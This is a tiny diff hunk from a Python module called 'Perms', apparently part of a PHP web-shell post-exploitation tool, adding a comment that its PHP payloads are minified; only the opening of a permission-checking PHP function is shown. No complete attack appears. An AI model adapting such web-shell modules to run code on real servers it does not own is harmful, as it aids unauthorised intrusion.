@@ -22,6 +22,7 @@ class Perms(Module):
 
         self.register_vectors(
             [
+            # Don't be scared of the side, the PHP payloads are automatically minified
             PhpCmd(
               payload = """
 function ckprint($df,$t,$a) {
